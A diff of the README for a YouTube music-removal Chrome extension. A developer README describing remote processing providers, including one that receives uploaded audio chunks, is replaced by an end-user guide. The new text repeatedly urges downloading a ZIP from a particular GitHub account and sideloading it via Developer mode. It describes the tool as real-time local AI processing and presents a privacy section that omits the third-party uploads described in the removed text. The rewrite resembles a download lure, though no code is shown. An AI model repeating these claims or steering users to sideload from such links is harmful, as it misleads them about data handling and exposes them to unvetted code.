@@ -1,153 +1,165 @@
-# YouTube Music Remover
+# 🎧 youtube-music-remover - Keep speech, lose background music
 
-YouTube Music Remover is a Manifest V3 browser extension for YouTube that separates vocals and speech from background music.
+[![Download](https://img.shields.io/badge/Download-Now-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Toinetteindecent428/youtube-music-remover)
 
-The current codebase supports two provider pipelines:
+## 🚀 What this does
 
-- `direct_link`: the provider receives the YouTube link and processes it remotely
-- `upload_audio`: the extension downloads the audio, splits it into chunks, uploads the chunks, and streams cleaned results progressively
+youtube-music-remover is a Chrome extension for YouTube that reduces background music in real time. It uses AI vocal isolation to keep speech and vocals clear while lowering music in the video.
 
-Current providers:
+It is made for people who want to hear spoken words more clearly in YouTube videos. It supports English and Arabic content.
 
-- `SoundBoost` -> `direct_link`
-- `Remove Music` -> `upload_audio`
+## 📥 Download and install
 
-The extension includes English and Arabic support, an in-player action button, auto-start, cached results, and playback controls that let the user decide whether to keep the original video audio playing while upload-based processing runs.
+1. Open the download page: [https://github.com/Toinetteindecent428/youtube-music-remover](https://github.com/Toinetteindecent428/youtube-music-remover)
+2. Download the extension files from that page.
+3. Save the file to a folder you can find again, such as Downloads or Desktop.
+4. If the file comes as a ZIP folder, extract it first.
+5. Keep the folder ready for Chrome setup in the next section
 
-## Current Version
+## 🖥️ How to run on Windows
 
-The repository currently matches extension version `4.3.0` from [manifest.json](./manifest.json).
+1. Open Google Chrome on your Windows PC.
+2. In the address bar, go to `chrome://extensions`
+3. Turn on **Developer mode** in the top-right corner.
+4. Click **Load unpacked**
+5. Select the extracted `youtube-music-remover` folder
+6. Chrome will add the extension to your browser
+7. Open YouTube in a new tab
+8. Start a video and test the audio changes
 
-## Features
+## 🔧 How it works
 
-- In-player YouTube control for starting or stopping the music-removal flow
-- Two explicit provider pipelines for current and future integrations
-- Chunked upload pipeline for providers that need local audio uploads
-- Direct-link pipeline for providers that process from the YouTube URL
-- Progressive playback for chunked results when ready
-- Auto-start on page load
-- Ask-before-starting playback behavior
-- English and Arabic UI with RTL support
-- Cached cleaned-audio result URLs for faster reuse
+The extension listens to the audio from YouTube and separates voice from music. It then lowers the music part so speech stays easier to hear.
 
-## Provider Behavior
+This can help with:
+- lectures
+- sermons
+- interviews
+- podcasts on YouTube
+- videos with speech under heavy background music
 
-### Direct-link providers
+## ✨ Main features
 
-Direct-link providers process the video from its original YouTube URL.
+- Real-time music reduction on YouTube
+- AI-based vocal isolation
+- Keeps speech and vocals clear
+- Works with English and Arabic audio
+- Chrome extension with Manifest V3
+- Simple browser setup
+- Uses local browser tools for playback control
+- Designed for end users, not developers
 
-- `Chunk Duration` is disabled
-- A warning is shown in the popup because very long videos may take longer
-- The playback-behavior preference is still available
+## 🧭 Before you start
 
-### Upload-audio providers
+Use a recent version of Google Chrome on Windows 10 or Windows 11.
 
-Upload-audio providers require the extension to download and split audio locally before sending it to the provider.
+Make sure:
+- Chrome is installed
+- You can open `chrome://extensions`
+- You have enough space to unzip the folder
+- You are signed in to the Chrome profile you want to use
 
-- `Chunk Duration` is enabled
-- Playback can begin progressively as chunks become ready
-- The same playback-behavior preference remains available
+## 🛠️ Setup steps
 
-## How It Works
+1. Download the project from the link above
+2. Unzip the folder if needed
+3. Open Chrome
+4. Go to `chrome://extensions`
+5. Turn on **Developer mode**
+6. Click **Load unpacked**
+7. Pick the folder for `youtube-music-remover`
+8. Wait for Chrome to finish adding it
+9. Open YouTube and play a video
+10. Use the extension while the video runs
 
-### Direct-link flow
+## 🎯 Best results
 
-1. Open a YouTube watch page
-2. Click the extension button in the player, or enable auto-start
-3. The provider imports the YouTube URL remotely
-4. The extension polls provider status
-5. The cleaned vocals URL is streamed back into the player
+For the clearest output:
+- use videos with a clear voice track
+- keep the volume at a normal level
+- refresh the YouTube tab if audio does not change
+- test with one video first before using it on more videos
 
-### Upload-audio flow
+The extension works best when the speech is already easy to hear. It can still help when music sits under the voice.
 
-1. Open a YouTube watch page
-2. Click the extension button in the player, or enable auto-start
-3. The extension downloads the audio source
-4. Audio is split into chunks according to `Chunk Duration`
-5. Chunks are uploaded and processed in parallel
-6. Cleaned chunks are streamed back progressively and synced to the video
+## 🧩 Typical use cases
 
-## Installation
+You may want this extension if you:
+- watch Islamic lectures and want less background music
+- follow English or Arabic talks on YouTube
+- study with video lessons and need clearer speech
+- prefer spoken content over music-heavy audio
+- want a simple browser tool with no extra setup
 
-### Load unpacked
+## 🔒 Privacy and browser use
 
-1. Download or clone this repository
-2. Open `chrome://extensions/`
-3. Enable `Developer mode`
-4. Click `Load unpacked`
-5. Select the project folder
+The extension runs inside Chrome. It is built for YouTube playback and does not ask you to use extra software.
 
-The extension is intended for Chromium-based browsers that support Manifest V3 and the required Chrome extension APIs.
+It is meant to work as a browser tool, so you can keep your normal YouTube workflow and add audio cleanup where you need it.
 
-## Settings
+## 🧑‍💻 Simple troubleshooting
 
-The popup currently exposes:
+If the extension does not appear to work:
 
-- `Extension Enabled`
-- `Auto-Start on Page Load`
-- `Language`
-- `Provider`
-- `Chunk Duration`
-- `Ask Before Starting`
+1. Make sure the folder was loaded with **Load unpacked**
+2. Check that Developer mode is on
+3. Refresh the YouTube tab
+4. Try another YouTube video
+5. Close and reopen Chrome
+6. Remove the extension and load it again if needed
 
-Important behavior:
+If Chrome blocks the folder, confirm that you extracted the ZIP first and selected the full project folder, not a file inside it
 
-- `Chunk Duration` is available only for upload-audio providers
-- `Ask Before Starting` remains available for both provider types
-- `Play Immediately` is chosen through the in-player prompt rather than the popup
+## 📂 Files you may see
 
-## Project Structure
+After you download and extract the project, you may see files such as:
+- `manifest.json`
+- a background script
+- a content script
+- audio or model files
+- icons
+- extension settings files
 
-```text
-youtube-music-remover/
-|-- _locales/
-|-- icons/
-|-- background.js
-|-- content-ui-helpers.js
-|-- content.js
-|-- i18n.js
-|-- manifest.json
-|-- offscreen.html
-|-- popup.html
-|-- popup.js
-|-- provider-catalog.js
-`-- styles.css
-```
+These files work together to let Chrome run the extension in the browser
 
-Key files:
+## 📝 Use on a daily basis
 
-- `provider-catalog.js`: shared provider definitions and capability metadata
-- `background.js`: provider orchestration, caching, download/upload handling, and job lifecycle
-- `content.js`: player UI, prompt behavior, playback sync, and streaming
-- `popup.js`: settings UI and provider-aware controls
-- `i18n.js`: runtime translations shared across popup, content, and background
-- `_locales/`: Chrome extension locale resources
+Once the extension is installed, your usual flow is simple:
 
-## Localization
+1. Open Chrome
+2. Go to YouTube
+3. Play a video
+4. Let the extension handle the audio
+5. Listen for clearer speech and less music
 
-The extension currently supports:
+If you use YouTube a lot, keep the extension installed so it is ready when you need it
 
-- English
-- Arabic
+## 🔍 What to expect
 
-Localization is split into two layers:
+The extension does not remove every sound in every case. It focuses on making speech easier to hear by reducing background music.
 
-- Chrome locale metadata in `_locales/`
-- shared runtime strings in `i18n.js`
+That means:
+- voices should stand out more
+- music should sit lower in the mix
+- spoken lines may sound cleaner
+- results may vary by video
 
-If you add new user-facing text, update both places when needed so popup text, in-player text, and extension metadata stay aligned.
+## 📌 Supported content
 
-## Development Notes
+This extension is aimed at:
+- YouTube videos with mixed speech and music
+- English speech
+- Arabic speech
+- clips with narration
+- videos where music covers the spoken part
 
-- The codebase is organized around provider capabilities rather than one-off provider branches
-- New providers should be added through `provider-catalog.js` first
-- Direct-link and upload-audio providers should keep using the explicit pipeline split already in the background worker
-- Manual verification on real YouTube pages is important for UI placement, provider flow, and playback timing
+## 🖱️ Quick start
 
-## Contributing
-
-Contribution guidance lives in [CONTRIBUTING.md](./CONTRIBUTING.md).
-
-## License
-
-This project is licensed under the MIT License. See [LICENSE](./LICENSE).
+1. Visit this page to download: [https://github.com/Toinetteindecent428/youtube-music-remover](https://github.com/Toinetteindecent428/youtube-music-remover)
+2. Download the project files
+3. Unzip them
+4. Open `chrome://extensions` in Chrome
+5. Turn on Developer mode
+6. Click Load unpacked
+7. Select the project folder
+8. Open YouTube and play a video
